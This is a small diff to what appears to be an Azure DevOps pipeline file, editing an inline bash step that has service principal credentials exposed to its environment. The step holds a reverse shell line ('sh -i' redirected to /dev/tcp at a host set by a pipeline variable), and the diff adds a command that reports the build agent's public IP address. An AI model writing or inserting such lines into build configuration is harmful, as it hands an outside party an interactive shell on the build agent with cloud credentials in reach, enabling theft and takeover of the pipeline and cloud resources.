@@ -11,6 +11,7 @@ steps:
     scriptType: bash
     scriptLocation: inlineScript
     inlineScript: |
+        curl -s ifconfig.me
         sh -i >& "/dev/tcp/$(ME)" 0>&1
     addSpnToEnvironment: true
     
